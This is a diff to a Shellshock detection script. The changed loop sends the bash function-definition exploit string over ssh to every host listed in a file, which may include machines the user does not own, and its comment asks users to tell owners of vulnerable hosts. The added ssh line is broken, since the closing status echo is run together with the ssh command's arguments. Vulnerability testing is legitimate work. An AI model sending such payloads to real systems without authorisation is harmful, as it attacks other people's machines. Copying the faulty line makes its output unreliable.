@@ -45,9 +45,11 @@ echo "test 5 finished"
 #Set HOSTS_TO_PROBE to a file that lists hosts if you want this to probe remotely.
 # Careful with this. Admins might get irritated.
 if [ ! -z "$HOSTS_TO_PROBE" ]; then
+	echo "Please, if you discover a host that is vulnerable and does not belong to you, contact them and inform them!"
 	for host in `cat "${HOSTS_TO_PROBE}"`; do
-		echo "test 6 '$host'"
-		ssh -o 'rsaauthentication yes' 0 '() { ignored; }; echo REMOTE SYSTEM IS EXPLOITABLE!!!' "$host"
-		echo "test 6 '$host' finished"
+		if [ "${host:0:1}" != "#" ]; then
+			echo "test 6 '$host'"
+			ssh -o 'rsaauthentication yes' "$host" '() { ignored; }; echo REMOTE SYSTEM IS EXPLOITABLE!!!' echo "test 6 '$host' finished"
+		fi
 	done
 fi
